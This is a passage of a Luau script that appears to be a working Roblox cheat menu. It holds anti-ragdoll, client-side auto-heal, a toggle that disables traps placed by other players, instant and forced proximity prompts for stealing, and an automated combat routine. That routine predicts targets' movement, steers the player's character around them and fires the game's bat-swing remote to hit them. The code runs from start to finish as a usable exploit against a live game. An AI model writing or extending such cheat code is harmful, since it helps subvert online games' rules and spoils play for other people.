				end

				if child:IsA("BasePart") then
					for _, child2 in ipairs(child:GetChildren()) do
						if ragdollConstraintClasses[child2.ClassName] then
							return true
						end
					end
				end
			end

			return false
		end

		local function fixAllRagdoll()
			limitRagdollVelocity()
			clearClientRagdoll()
			destroyRagdollConstraints()
			enableMotor6Ds()
			fixHumanoidState()
			enablePlayerControls()
			resetCameraSubject()
		end

		local function triggerRagdollRecovery()
			if not isAntiRagdollActive or isAntiGuardBusy() then
				return
			end
			recoveryEndTime = os.clock() + RAGDOLL_RECOVERY_WINDOW
		end

		local function checkCharacterChanged()
			local character = localPlayer.Character

			if character ~= targetCharacter then
				if character then
					onCharacterAdded(character)
				else
					characterId += 1
					disconnectAll(characterConnections)
					targetCharacter = nil
					targetHumanoid = nil
				end

				return
			end

			if not targetCharacter then
				return
			end

			if targetCharacter:FindFirstChildOfClass("Humanoid") ~= targetHumanoid then
				onCharacterAdded(targetCharacter)
			end
		end

		local function antiRagdollLoop()
			if not isAntiRagdollActive then
				return
			end
			checkCharacterChanged()
			if not targetCharacter or not targetHumanoid or targetHumanoid.Health <= 0 then
				return
			end

			if isAntiGuardBusy() then
				recoveryEndTime = 0
				return
			end
			local now = os.clock()

			if isHumanoidRagdolled() or isPlayerRagdolled() or hasRagdollConstraints() then
				recoveryEndTime = now + RAGDOLL_RECOVERY_WINDOW
			end

			if now <= recoveryEndTime then
				fixAllRagdoll()
			end
		end

		onCharacterAdded = function(characterObj)
			characterId += 1
			local currentId = characterId
			disconnectAll(characterConnections)
			targetCharacter = characterObj
			targetHumanoid = nil
			if not isAntiRagdollActive or not characterObj then
				return
			end
			targetHumanoid = characterObj:FindFirstChildOfClass("Humanoid")
			if not isAntiRagdollActive or characterId ~= currentId or characterObj ~= localPlayer.Character or not targetHumanoid or not targetHumanoid:IsA("Humanoid") then
				return
			end

			addCharacterConnection(targetHumanoid.StateChanged:Connect(function(old, new)
				if isAntiRagdollActive and ragdollHumanoidStates[new] then
					triggerRagdollRecovery()
				end
			end))

			addCharacterConnection(targetHumanoid:GetPropertyChangedSignal("PlatformStand"):Connect(function()
				if isAntiRagdollActive and targetHumanoid and targetHumanoid.PlatformStand then
					triggerRagdollRecovery()
				end
			end))

			addCharacterConnection(characterObj.DescendantAdded:Connect(function(descendant)
				if isAntiRagdollActive and ragdollConstraintClasses[descendant.ClassName] then
					triggerRagdollRecovery()
				end
			end))

			addCharacterConnection(characterObj.ChildAdded:Connect(function(child)
				if isAntiRagdollActive and child:IsA("Humanoid") and child ~= targetHumanoid then
					task.defer(checkCharacterChanged)
				end
			end))

			resetCameraSubject()

			if isPlayerRagdolled() then
				triggerRagdollRecovery()
			end
		end

		local function stopAntiRagdoll()
			isAntiRagdollActive = false
			characterId += 1
			recoveryEndTime = 0

			if antiRagdollConnection then
				pcall(function()
					antiRagdollConnection:Disconnect()
				end)

				antiRagdollConnection = nil
			end

			disconnectAll(characterConnections)
			disconnectAll(globalConnections)
			targetCharacter = nil
			targetHumanoid = nil
		end

		local function startAntiRagdoll()
			stopAntiRagdoll()
			isAntiRagdollActive = true
			getPlayerControls()
			antiRagdollConnection = RunService.Heartbeat:Connect(antiRagdollLoop)

			addGlobalConnection(localPlayer.CharacterAdded:Connect(function(character)
				if isAntiRagdollActive then
					task.defer(function()
						if isAntiRagdollActive and character == localPlayer.Character then
							onCharacterAdded(character)
						end
					end)
				end
			end))

			addGlobalConnection(localPlayer.CharacterRemoving:Connect(function(character)
				if isAntiRagdollActive and character == targetCharacter then
					characterId += 1
					recoveryEndTime = 0
					disconnectAll(characterConnections)
					targetCharacter = nil
					targetHumanoid = nil
				end
			end))

			addGlobalConnection(localPlayer:GetAttributeChangedSignal("RagdollEndTime"):Connect(function()
				if isAntiRagdollActive then
					triggerRagdollRecovery()
				end
			end))

			local clientRagdollRemote = type(RagdollModule) == "table" and RagdollModule.ClientRagdollRemote or nil

			if typeof(clientRagdollRemote) == "Instance" and clientRagdollRemote:IsA("RemoteEvent") then
				addGlobalConnection(clientRagdollRemote.OnClientEvent:Connect(function()
					if isAntiRagdollActive and not isAntiGuardBusy() then
						limitRagdollVelocity()
						triggerRagdollRecovery()
					end
				end))
			end

			addGlobalConnection(chilliState.OnHumanoidChanged(function()
				if isAntiRagdollActive and localPlayer.Character then
					onCharacterAdded(localPlayer.Character)
				end
			end))

			if localPlayer.Character then
				onCharacterAdded(localPlayer.Character)
			end
		end

		trackCleanup(stopAntiRagdoll)

		local antiRagdollOptions = {
			Name = "Anti Ragdoll",
			Default = true,
			Callback = function()
				if chilliState.Toggle(antiRagdollToggleHandle, false) then
					startAntiRagdoll()
				else
					stopAntiRagdoll()
				end
			end,
		}

		antiRagdollToggleHandle = characterSection:CreateToggle(antiRagdollOptions)
	end

	do
		local isAutoHealEnabled = false
		local autoHealConnections = {}

		local function disconnectAutoHeal()
			for _, conn in ipairs(autoHealConnections) do
				pcall(function()
					conn:Disconnect()
				end)
			end

			table.clear(autoHealConnections)
		end

		local function applyHeal(characterObj)
			if isAutoHealEnabled and characterObj.Parent and characterObj.Health > 0 and characterObj.Health < characterObj.MaxHealth then
				pcall(function()
					characterObj.Health = characterObj.MaxHealth
				end)
			end
		end

		local function setupAutoHealForCharacter(characterObj)
			disconnectAutoHeal()
			if not isAutoHealEnabled or not characterObj then
				return
			end
			local humanoid = characterObj:FindFirstChildOfClass("Humanoid") or characterObj:WaitForChild("Humanoid", 5)
			if not isAutoHealEnabled or not humanoid or not humanoid:IsA("Humanoid") or characterObj ~= localPlayer.Character then
				return
			end

			table.insert(autoHealConnections, humanoid.HealthChanged:Connect(function()
				applyHeal(humanoid)
			end))

			table.insert(autoHealConnections, RunService.Heartbeat:Connect(function()
				applyHeal(humanoid)
			end))

			applyHeal(humanoid)
		end

		local characterAddedConn = localPlayer.CharacterAdded:Connect(function(character)
			if isAutoHealEnabled then
				task.defer(setupAutoHealForCharacter, character)
			end
		end)

		local humanoidChangedConn = chilliState.OnHumanoidChanged(function()
			if isAutoHealEnabled and localPlayer.Character then
				setupAutoHealForCharacter(localPlayer.Character)
			end
		end)

		trackCleanup(function()
			isAutoHealEnabled = false
			characterAddedConn:Disconnect()
			humanoidChangedConn:Disconnect()
			disconnectAutoHeal()
		end)

		isAutoHealEnabled = true

		if localPlayer.Character then
			task.spawn(setupAutoHealForCharacter, localPlayer.Character)
		end
	end

	do
		local antiTrapToggleHandle = nil
		local isAntiTrapEnabled = true
		local trapPartsOriginalCanTouch = {}
		local trapDescendantConnections = {}

		local function disableTrapPart(part)
			if part:IsA("BasePart") and trapPartsOriginalCanTouch[part] == nil then
				trapPartsOriginalCanTouch[part] = part.CanTouch

				pcall(function()
					part.CanTouch = false
				end)
			end
		end

		local function disableTrapModel(trapModel)
			if not isAntiTrapEnabled or not trapModel.Parent then
				return
			end
			local name = localPlayer.Name
			if trapModel:GetAttribute("Owner") == name then
				return
			end
			disableTrapPart(trapModel)

			for _, descendant in ipairs(trapModel:GetDescendants()) do
				disableTrapPart(descendant)
			end

			table.insert(trapDescendantConnections, trapModel.DescendantAdded:Connect(function(descendant)
				if isAntiTrapEnabled then
					disableTrapPart(descendant)
				end
			end))
		end

		local function disableAllPlacedTraps()
			for _, trap in ipairs(CollectionService:GetTagged("PlacedTrap")) do
				disableTrapModel(trap)
			end
		end

		local function restoreAllTraps()
			for part, originalCanTouch in pairs(trapPartsOriginalCanTouch) do
				if part.Parent then
					pcall(function()
						part.CanTouch = originalCanTouch
					end)
				end
			end

			table.clear(trapPartsOriginalCanTouch)
		end

		table.insert(trapDescendantConnections, CollectionService:GetInstanceAddedSignal("PlacedTrap"):Connect(function(trap)
			task.defer(disableTrapModel, trap)
		end))

		antiTrapToggleHandle = characterSection:CreateToggle({
			Name = "Anti Trap",
			Note = "Traps from other players cannot catch you",
			Default = true,
			Callback = function()
				isAntiTrapEnabled = chilliState.Toggle(antiTrapToggleHandle, true) == true

				if isAntiTrapEnabled then
					disableAllPlacedTraps()
				else
					restoreAllTraps()
				end
			end,
		})

		disableAllPlacedTraps()

		trackCleanup(function()
			isAntiTrapEnabled = false

			for _, conn in ipairs(trapDescendantConnections) do
				pcall(function()
					conn:Disconnect()
				end)
			end

			table.clear(trapDescendantConnections)
			restoreAllTraps()
		end)
	end

	do
		local instantPromptToggleHandle = nil
		local targetPromptName = "CarryAreaEgg"
		local ignoredPromptNames = { ClaimLostPart = true }
		local originalHoldDurations = {}
		local workspaceChildAddedConn = nil
		local promptShownConn = nil

		local function overridePromptDuration(prompt)
			if not prompt:IsA("ProximityPrompt") or ignoredPromptNames[prompt.Name] then
				return
			end

			if originalHoldDurations[prompt] == nil then
				if prompt.HoldDuration <= 0 and prompt.Name ~= targetPromptName then
					return
				end
				originalHoldDurations[prompt] = prompt.HoldDuration
			end

			if prompt.HoldDuration ~= 0 then
				pcall(function()
					prompt.HoldDuration = 0
				end)
			end
		end

		local function findCarryAreaEggPrompt(part)
			if part.Name ~= "SmartPromptPart" then
				return nil
			end
			local carryAreaEgg = part:FindFirstChild("CarryAreaEgg")
			return carryAreaEgg and carryAreaEgg:IsA("ProximityPrompt") and carryAreaEgg or nil
		end

		chilliState.PromptHold = function(prompt)
			local originalDuration = originalHoldDurations[prompt]
			if type(originalDuration) == "number" then
				return originalDuration
			end
			return prompt.HoldDuration
		end

		local function setupInstantPrompts()
			if workspaceChildAddedConn then
				return
			end

			promptShownConn = ProximityPromptService.PromptShown:Connect(function(prompt)
				if chilliState.Toggle(instantPromptToggleHandle, true) then
					overridePromptDuration(prompt)
				end
			end)

			for _, child in ipairs(workspace:GetChildren()) do
				local prompt = findCarryAreaEggPrompt(child)

				if prompt then
					overridePromptDuration(prompt)
				end
			end

			workspaceChildAddedConn = workspace.ChildAdded:Connect(function(child)
				if child.Name ~= "SmartPromptPart" then
					return
				end

				task.defer(function()
					local carryAreaEgg = child:FindFirstChild("CarryAreaEgg") or child:WaitForChild("CarryAreaEgg", 2)

					if carryAreaEgg and carryAreaEgg:IsA("ProximityPrompt") and chilliState.Toggle(instantPromptToggleHandle, true) then
						overridePromptDuration(carryAreaEgg)
					end
				end)
			end)
		end

		local function restorePromptDurations()
			for prompt, originalDuration in pairs(originalHoldDurations) do
				if prompt and prompt.Parent then
					pcall(function()
						prompt.HoldDuration = originalDuration
					end)
				end
			end

			table.clear(originalHoldDurations)

			if workspaceChildAddedConn then
				workspaceChildAddedConn:Disconnect()
				workspaceChildAddedConn = nil
			end

			if promptShownConn then
				promptShownConn:Disconnect()
				promptShownConn = nil
			end
		end

		chilliState.PressStealPrompt = function(targetPosition)
			if typeof(fireproximityprompt) ~= "function" or not targetPosition then
				return false
			end
			local closestPrompt = nil
			local closestDistance = math.huge

			for _, child in ipairs(workspace:GetChildren()) do
				local prompt = findCarryAreaEggPrompt(child)

				if prompt and child:IsA("BasePart") then
					local distance = (child.Position - targetPosition).Magnitude

					if distance < closestDistance then
						closestPrompt = prompt
						closestDistance = distance
					end
				end
			end

			if not closestPrompt or closestDistance > 14 then
				return false
			end

			if chilliState.Toggle(instantPromptToggleHandle, true) then
				pcall(function()
					closestPrompt.HoldDuration = 0
				end)
			end

			local ok = pcall(fireproximityprompt, closestPrompt)

			if ok and closestPrompt.HoldDuration > 0 then
				task.wait(closestPrompt.HoldDuration + 0.1)
			end

			return ok
		end

		taskScheduler.Add(function()
			if chilliState.Toggle(instantPromptToggleHandle, true) then
				setupInstantPrompts()

				for prompt in pairs(originalHoldDurations) do
					if not prompt.Parent then
						originalHoldDurations[prompt] = nil
					elseif prompt.HoldDuration ~= 0 then
						pcall(function()
							prompt.HoldDuration = 0
						end)
					end
				end
			elseif next(originalHoldDurations) ~= nil or workspaceChildAddedConn then
				restorePromptDurations()
			end

			return false
		end)

		instantPromptToggleHandle = characterSection:CreateToggle({
			Name = "Instant Prompts",
			Default = true,
			Callback = function()
				taskScheduler.Wake()
			end,
		})

		trackCleanup(restorePromptDurations)
	end

	chilliState.Combat = {}

	do
		local combat = chilliState.Combat
		local BASE_RANGE = 15
		local RANGE_OFFSET = 2
		local SWING_DELAY = 0.05
		local RANGE_BUFFER = 1
		local EXTRAPOLATION_TIME = 0.18
		local LEAD_TIME = -0.275
		local SWEEP_ANGLE = 0.6
		local SWEEP_DISTANCE = 6
		local ORBIT_PERIOD_X = 1.1
		local ORBIT_PERIOD_Y = 0.8
		local ORBIT_AMPLITUDE_Y = 2.5
		local SPEED_THRESHOLD_FLAT = 35
		local VELOCITY_SAMPLE_WINDOW = 0.12
		local WALL_CLEARANCE = 6
		local WALL_INTERPOLATION_STEPS = 6
		local GROUND_CLEARANCE = 3
		local HIT_TIMINGS = { 0.12, 0.2, 0.28, 0.36, 0.46, 0.6 }
		local WALL_NAMES = { ["WALL LEFT"] = true, ["WALL RIGHT"] = true }

		local combatState = {
			Trigger = nil,
			LastFire = 0,
			Trace = 0,
			EquipAt = 0,
			Walls = {},
			WallsAt = 0,
			WallSide = setmetatable({}, { __mode = "k" }),
			Tracks = setmetatable({}, { __mode = "k" }),
			Stats = {},
			Option = 3,
			Pending = {},
			Holders = {},
			SpawnRagdoll = nil,
		}

		for i = 1, #HIT_TIMINGS do
			combatState.Stats[i] = { Hits = 0, Shots = 0 }
		end

		local raycastParams = RaycastParams.new()
		raycastParams.FilterType = Enum.RaycastFilterType.Exclude

		pcall(function()
			raycastParams.RespectCanCollide = true
		end)

		local function getServerTimeNow()
			return workspace:GetServerTimeNow()
		end

		local function getBatSwingTrigger()
			local trigger = combatState.Trigger
			if trigger and trigger.Parent then
				return trigger
			end
			local reBatSwingTrigger = networking:FindFirstChild("RE/BatSwing/Trigger")
			combatState.Trigger = reBatSwingTrigger
			return reBatSwingTrigger
		end

		local function getRagdollEndTime(playerObj)
			return tonumber(playerObj:GetAttribute("RagdollEndTime")) or 0
		end

		combat.SetLead = function(value)
			LEAD_TIME = math.clamp((tonumber(value) or -275) / 1000, -0.4, 0.1)
		end

		combat.SetSweep = function(value)
			SWEEP_ANGLE = math.clamp((tonumber(value) or 60) / 100, 0, 2.5)
		end

		combat.Ragdolled = function(playerObj)
			return getRagdollEndTime(playerObj) > getServerTimeNow()
		end

		combat.SelfRagdolled = function()
			local ragdollTime = getRagdollEndTime(localPlayer)
			if ragdollTime <= getServerTimeNow() then
				return false
			end
			return ragdollTime ~= combatState.SpawnRagdoll
		end

		combat.Humanoid = function(characterObj)
			if not characterObj then
				return nil
			end
			local foundHumanoid = nil

			for _, child in ipairs(characterObj:GetChildren()) do
				if child:IsA("Humanoid") then
					if child.Health > 0 then
						return child
					end
					foundHumanoid = foundHumanoid or child
				end
			end

			return foundHumanoid
		end

		local function getBatRangeBonus(batTool)
			local gears = gameModules.Gears
			local directory = type(gears) == "table" and gears.Directory or nil
			local gearData = type(directory) == "table"

			if gearData then
				gearData = directory[tostring(batTool:GetAttribute("GearName") or batTool.Name)]
			end

			gearData = gearData or nil
			local batControllerData = type(gearData) == "table" and gearData.BatControllerData or nil
			return type(batControllerData) == "table" and tonumber(batControllerData.RangeBonus) or 0
		end

		combat.Range = function(batTool)
			local eventRangeBonus = workspace:GetAttribute("DragonEggEventActive") == true and 2.5 or 1
			return (BASE_RANGE + RANGE_OFFSET + (batTool and getBatRangeBonus(batTool) or 0)) * eventRangeBonus
		end

		combat.PickBat = function(characterObj)
			local tool = characterObj:FindFirstChildWhichIsA("Tool")
			if tool and chilliState.IsBatTool(tool) then
				return tool
			end
			local searchTargets = ipairs({ characterObj, localPlayer:FindFirstChildOfClass("Backpack") })
			local maxBonus = -1
			local bestBat = nil

			for _, target in searchTargets do
				if target then
					for _, child in ipairs(target:GetChildren()) do
						if chilliState.IsBatTool(child) then
							local bonus = getBatRangeBonus(child)

							if maxBonus < bonus then
								maxBonus = bonus
								bestBat = child
							end
						end
					end
				end
			end

			return bestBat
		end

		local function equipBat(characterObj, humanoid, batTool)
			if batTool.Parent == characterObj then
				return true
			end
			local equipAt = combatState.EquipAt
			if os.clock() - equipAt < 0.2 then
				return false
			end
			combatState.EquipAt = os.clock()

			pcall(function()
				humanoid:EquipTool(batTool)
			end)

			if batTool.Parent ~= characterObj then
				pcall(function()
					batTool.Parent = characterObj
				end)
			end

			return batTool.Parent == characterObj
		end

		combat.Parts = function(playerObj)
			local characterObj = playerObj and playerObj.Character
			local humanoidRootPart = characterObj and characterObj:FindFirstChild("HumanoidRootPart")
			local humanoid = characterObj and characterObj:FindFirstChildOfClass("Humanoid")
			if not humanoidRootPart or not humanoid or humanoid.Health <= 0 then
				return nil, nil
			end
			return characterObj, humanoidRootPart
		end

		combat.Hittable = function(playerObj)
			if not playerObj or playerObj == localPlayer or playerObj.Parent ~= Players then
				return false
			end
			local targetCharacter, targetRootPart = combat.Parts(playerObj)
			if not targetCharacter then
				return false
			end

			if targetCharacter:GetAttribute("IsTrapped") == true or playerObj:GetAttribute("InBossArena") then
				return false
			end
			return not chilliState.InsideBase(targetRootPart.Position)
		end

		local function getArenaWalls()
			local wallsAt = combatState.WallsAt
			if os.clock() < wallsAt then
				return combatState.Walls
			end
			combatState.WallsAt = os.clock() + 5
			local walls = {}
			local world = workspace:FindFirstChild("World") or workspace:FindFirstChild("__OBJECTS")
			world = world and world:FindFirstChild("Build")

			if world then
				for _, child in ipairs(world:GetChildren()) do
					local collisions = child:FindFirstChild("COLLISIONS")
					collisions = collisions and collisions:FindFirstChild("GUARD NO COLLIDE")

					if collisions then
						for _, child2 in ipairs(collisions:GetChildren()) do
							if WALL_NAMES[child2.Name] then
								if child2:IsA("BasePart") then
									table.insert(walls, child2)
								end

								for _, descendant in ipairs(child2:GetDescendants()) do
									if descendant:IsA("BasePart") then
										table.insert(walls, descendant)
									end
								end
							end
						end
					end
				end
			end

			combatState.Walls = walls
			return walls
		end

		local function getShortestAxes(size)
			if size.X <= size.Y and size.X <= size.Z then
				return "X", "Y", "Z"
			end

			if size.Y <= size.Z then
				return "Y", "X", "Z"
			end
			return "Z", "X", "Y"
		end

		local function getUpAxis(cframe)
			local absX = math.abs(cframe.RightVector.Y)
			local absY = math.abs(cframe.UpVector.Y)
			local absZ = math.abs(cframe.LookVector.Y)
			if absX >= absY and absX >= absZ then
				return "X"
			end

			if absY >= absZ then
				return "Y"
			end
			return "Z"
		end

		local function isWithinBounds(offset, halfSize, axis, ignoreAxis)
			if axis == ignoreAxis then
				return true
			end
			local threshold = halfSize[axis] + WALL_CLEARANCE
			return math.abs(offset[axis]) <= threshold
		end

		local function pushOffWalls(startPos, targetPos)
			for _, wallPart in ipairs(getArenaWalls()) do
				if wallPart.Parent then
					local cFrame = wallPart.CFrame
					local size = wallPart.Size
					local shortestAxis, otherAxis1, otherAxis2 = getShortestAxes(size)
					local upAxis = getUpAxis(cFrame)
					local halfSize = size / 2
					local targetOffset = cFrame:PointToObjectSpace(targetPos)

					if isWithinBounds(targetOffset, halfSize, otherAxis1, upAxis) and isWithinBounds(targetOffset, halfSize, otherAxis2, upAxis) then
						local startOffset = cFrame:PointToObjectSpace(startPos)
						local absStartOffset = math.abs(startOffset[shortestAxis])
						local wallSide = combatState.WallSide[wallPart]

						if absStartOffset >= halfSize[shortestAxis] + WALL_CLEARANCE * 0.5 or wallSide == nil and absStartOffset >= halfSize[shortestAxis] then
							wallSide = startOffset[shortestAxis] >= 0 and 1 or -1
							combatState.WallSide[wallPart] = wallSide
						elseif wallSide == nil then
							wallSide = startOffset[shortestAxis] >= 0 and 1 or -1
						end

						local boundary = halfSize[shortestAxis] + WALL_CLEARANCE

						if targetOffset[shortestAxis] * wallSide < boundary then
							local newOffset = { X = targetOffset.X, Y = targetOffset.Y, Z = targetOffset.Z, [shortestAxis] = wallSide * boundary }
							targetPos = cFrame:PointToWorldSpace(Vector3.new(newOffset.X, newOffset.Y, newOffset.Z))
						end
					end
				end
			end

			return targetPos
		end

		combat.KeepOffWalls = function(startPos, targetPos)
			local newTargetPos = pushOffWalls(startPos, targetPos)
			local offset = newTargetPos - startPos

			if WALL_CLEARANCE < offset.Magnitude then
				local currentPos = startPos

				for i = 1, 6 do
					local intermediatePos = startPos + offset * i / WALL_INTERPOLATION_STEPS
					local pushedPos = pushOffWalls(currentPos, intermediatePos)
					if (pushedPos - intermediatePos).Magnitude > 0.01 then
						return pushOffWalls(startPos, pushedPos)
					end
					currentPos = pushedPos
				end
			end

			return newTargetPos
		end

		combat.ResetWalls = function()
			table.clear(combatState.WallSide)
		end

		local lastRaycastUpdate = 0
		local lastRaycastCharacter = nil

		local function snapToGround(position)
			local character = localPlayer.Character

			if os.clock() - lastRaycastUpdate > 0.5 or character ~= lastRaycastCharacter then
				lastRaycastUpdate = os.clock()
				lastRaycastCharacter = character
				local filterDescendantsInstances = {}

				for _, player in ipairs(Players:GetPlayers()) do
					if player.Character then
						table.insert(filterDescendantsInstances, player.Character)
					end
				end

				raycastParams.FilterDescendantsInstances = filterDescendantsInstances
			end

			local hit = workspace:Raycast(position + Vector3.new(0, 60, 0), Vector3.new(0, -400, 0), raycastParams)
			if hit and position.Y < hit.Position.Y + GROUND_CLEARANCE then
				return Vector3.new(position.X, hit.Position.Y + GROUND_CLEARANCE, position.Z)
			end
			return position
		end

		local function getTrackedVelocity(playerObj, characterRootPart)
			local track = combatState.Tracks[playerObj]

			if not track then
				local newTrack = { Samples = {}, Smooth = nil, Heading = nil }
				combatState.Tracks[playerObj] = newTrack
				track = newTrack
			end

			local now = os.clock()
			local samples = track.Samples
			table.insert(samples, { Time = now, Position = characterRootPart.Position })

			while #samples > 2 and now - samples[1].Time > VELOCITY_SAMPLE_WINDOW do
				table.remove(samples, 1)
			end

			local assemblyLinearVelocity = characterRootPart.AssemblyLinearVelocity
			local oldestSample = samples[1]
			local deltaTime = now - oldestSample.Time
			local velocity

			if deltaTime >= 0.03 then
				velocity = (characterRootPart.Position - oldestSample.Position) / deltaTime

				if not (velocity.Magnitude <= 1500 and assemblyLinearVelocity.Magnitude <= velocity.Magnitude * 1.4) then
					velocity = assemblyLinearVelocity
				end
			else
				velocity = assemblyLinearVelocity
			end

			local flatVelocity = Vector3.new(velocity.X, 0, velocity.Z)
			track.Smooth = track.Smooth and track.Smooth:Lerp(flatVelocity, 0.25) or flatVelocity
			local smoothVelocity = track.Smooth

			if smoothVelocity.Magnitude > 1 then
				local heading = track.Heading and track.Heading:Lerp(smoothVelocity.Unit, 0.25) or smoothVelocity.Unit
				track.Heading = heading.Magnitude > 0.01 and heading.Unit or smoothVelocity.Unit
			end

			return velocity, flatVelocity, smoothVelocity, track
		end

		local function getBestHitTimingOption()
			local totalShots = 0

			for _, stat in ipairs(combatState.Stats) do
				totalShots += stat.Shots
			end

			local bestOption = combatState.Option
			local maxScore = -math.huge

			for i, stat in ipairs(combatState.Stats) do
				local shots = stat.Shots + 1
				local score = (stat.Hits + 1) / (stat.Shots + 2) + math.sqrt(2 * math.log(totalShots + 2) / shots) * 0.35

				if score > maxScore then
					maxScore = score
					bestOption = i
				end
			end

			combatState.Option = bestOption
			return bestOption
		end

		local function processPendingHits()
			local now = os.clock()

			for i = #combatState.Pending, 1, -1 do
				local pendingHit = combatState.Pending[i]
				local stat = combatState.Stats[pendingHit.Option]

				if pendingHit.RagdollBefore + 0.01 < getRagdollEndTime(pendingHit.Target) then
					stat.Hits = stat.Hits + 1
					stat.Shots = stat.Shots + 1
					table.remove(combatState.Pending, i)
				elseif pendingHit.Wait < now - pendingHit.At then
					if (pendingHit.Tool and tonumber(pendingHit.Tool:GetAttribute("CooldownEndTime")) or 0) > pendingHit.CooldownBefore + 0.01 then
						stat.Shots = stat.Shots + 1
					end

					table.remove(combatState.Pending, i)
				end
			end
		end

		combat.Plan = function(targetPlayer, selfRootPart, targetRootPart, skipWallCheck)
			if not targetRootPart then
				local characterObj
				characterObj, targetRootPart = combat.Parts(targetPlayer)
			end

			if not targetRootPart or not targetRootPart.Parent then
				return nil
			end
			local ping = math.clamp(localPlayer:GetNetworkPing(), 0, 1)
			local pingDelay = math.clamp(ping + SWING_DELAY, 0.05, 0.35)
			local _, flatVelocity, smoothVelocity, track = getTrackedVelocity(targetPlayer or targetRootPart, targetRootPart)
			local timingOption = getBestHitTimingOption()
			local hitTiming = HIT_TIMINGS[timingOption]
			local targetPos = targetRootPart.Position
			local historicalTargetPos = targetPos + flatVelocity * math.max(0, hitTiming + ping - pingDelay)
			local currentTargetPos = targetPos + flatVelocity * (hitTiming + ping)
			local velocityMagnitude = smoothVelocity.Magnitude
			local targetHeading = track.Heading

			if not targetHeading then
				local offset = Vector3.new(selfRootPart.Position.X - targetPos.X, 0, selfRootPart.Position.Z - targetPos.Z)
				targetHeading = offset.Magnitude > 0.1 and offset.Unit or Vector3.new(0, 0, 1)
			end

			local character = localPlayer.Character
			local batRange = combat.Range(character and combat.PickBat(character) or nil)
			local projectedTargetPos = targetPos + smoothVelocity * (ping + hitTiming + EXTRAPOLATION_TIME + LEAD_TIME) + (velocityMagnitude > 1 and smoothVelocity.Unit * SWEEP_DISTANCE * SWEEP_ANGLE or Vector3.zero)
			local orbitRadius = math.max(5, math.min(batRange * 0.7, 6 + velocityMagnitude * 0.07)) * SWEEP_ANGLE
			local now = os.clock()
			local orbitX = (math.sin(now * 2 * math.pi / ORBIT_PERIOD_X) * 0.5 + 0.5) * orbitRadius
			local orbitY = math.sin(now * 2 * math.pi / ORBIT_PERIOD_Y) * ORBIT_AMPLITUDE_Y
			local tangentVector = Vector3.new(-targetHeading.Z, 0, targetHeading.X)

			if tangentVector:Dot(selfRootPart.Position - projectedTargetPos) < 0 then
				tangentVector = -tangentVector
			end

			local goalPosition = projectedTargetPos + targetHeading * orbitX + tangentVector * (flatVelocity.Magnitude < SPEED_THRESHOLD_FLAT and 3 or 1.5) + Vector3.new(0, orbitY, 0)
			local startPos = selfRootPart.Position

			if not skipWallCheck then
				startPos = combat.KeepOffWalls(selfRootPart.Position, snapToGround(Vector3.new(goalPosition.X, goalPosition.Y, targetPos.Z)))
			end

			return {
				Goal = startPos,
				Velocity = Vector3.new(smoothVelocity.X, 0, smoothVelocity.Z),
				Face = currentTargetPos,
				Current = currentTargetPos,
				Historical = historicalTargetPos,
				Option = timingOption,
				Distance = (targetPos - selfRootPart.Position).Magnitude,
			}
		end

		combat.Steer = function(rootPart, planData, currentSpeed, maxSpeed, dt)
			local timeStep = math.max(dt, 0.0041666666666666666)
			local baseVelocity = planData.Velocity
			local acceleration = baseVelocity + (planData.Goal - rootPart.Position) / math.max(0.12, timeStep)
			local speedLimit = math.min(currentSpeed + baseVelocity.Magnitude, maxSpeed)

			if acceleration.Magnitude > speedLimit then
				acceleration = acceleration.Unit * speedLimit
			end

			local position = rootPart.Position
			local predictedPos = position + acceleration * timeStep
			local safePos = combat.KeepOffWalls(position, predictedPos)

			if (safePos - predictedPos).Magnitude > 0.01 then
				acceleration = (safePos - position) / timeStep
			end

			local currentSafePos = combat.KeepOffWalls(position, position)

			if (currentSafePos - position).Magnitude > 0.01 then
				acceleration = (currentSafePos - position) / math.max(0.12, timeStep)
			end

			local assemblyLinearVelocity = acceleration + Vector3.new(0, workspace.Gravity * timeStep * 0.5, 0)

			pcall(function()
				local faceVector = Vector3.new(planData.Face.X - position.X, 0, planData.Face.Z - position.Z)

				if faceVector.Magnitude > 0.05 then
					rootPart.CFrame = CFrame.lookAt(position, position + faceVector.Unit)
				end

				rootPart.AssemblyLinearVelocity = assemblyLinearVelocity
				rootPart.AssemblyAngularVelocity = Vector3.zero
			end)
		end

		combat.TryHit = function(targetPlayer, planData)
			processPendingHits()
			if workspace:GetAttribute("PvPDisabled") == true then
				return "Player hits are off right now"
			end
			local character = localPlayer.Character
			local humanoidRootPart = character and character:FindFirstChild("HumanoidRootPart")
			local humanoid = combat.Humanoid(character)
			if not humanoidRootPart or not humanoid or humanoid.Health <= 0 then
				return "Waiting for your character"
			end
			local batTool = combat.PickBat(character)
			if not batTool then
				return "No bat found"
			end

			if not equipBat(character, humanoid, batTool) then
				return "Equipping " .. tostring(batTool:GetAttribute("GearName") or batTool.Name)
			end

			if not combat.Hittable(targetPlayer) or combat.Ragdolled(targetPlayer) then
				return nil
			end
			planData = planData or combat.Plan(targetPlayer, humanoidRootPart)
			if not planData then
				return nil
			end
			local maxDist = combat.Range(batTool) - RANGE_BUFFER
			local extrapolatedPos = humanoidRootPart.Position - humanoidRootPart.AssemblyLinearVelocity * EXTRAPOLATION_TIME
			if (planData.Historical - extrapolatedPos).Magnitude > maxDist and (planData.Current - extrapolatedPos).Magnitude > maxDist then
				return nil
			end
			local swingTrigger = getBatSwingTrigger()
			if not swingTrigger then
				return nil
			end
			local ping = math.clamp(localPlayer:GetNetworkPing(), 0, 1)
			local cooldownEndTime = tonumber(batTool:GetAttribute("CooldownEndTime")) or 0
			if getServerTimeNow() < cooldownEndTime - ping * 0.5 then
				return nil
			end
			local lastFire = combatState.LastFire
			if os.clock() - lastFire < math.max(0.12, ping * 1.5) then
				return nil
			end
			combatState.LastFire = os.clock()
			combatState.Trace = combatState.Trace + 1

			table.insert(combatState.Pending, {
				Target = targetPlayer,
				Option = planData.Option,
				At = os.clock(),
				Wait = math.max(0.5, ping * 2 + 0.3),
				RagdollBefore = getRagdollEndTime(targetPlayer),
				CooldownBefore = cooldownEndTime,
				Tool = batTool,
			})

			local hitId = string.format("%d:%d:%d", localPlayer.UserId, combatState.Trace, math.floor(getServerTimeNow() * 1000))

			pcall(function()
				swingTrigger:FireServer(targetPlayer, hitId)
			end)

			return "Hitting " .. targetPlayer.DisplayName
		end

		combat.ReadyBat = function()
			local character = localPlayer.Character
			local humanoid = combat.Humanoid(character)
			if not character or not humanoid or humanoid.Health <= 0 then
				return false
			end
			local batTool = combat.PickBat(character)
			return batTool ~= nil and equipBat(character, humanoid, batTool)
		end

		combat.Swing = function()
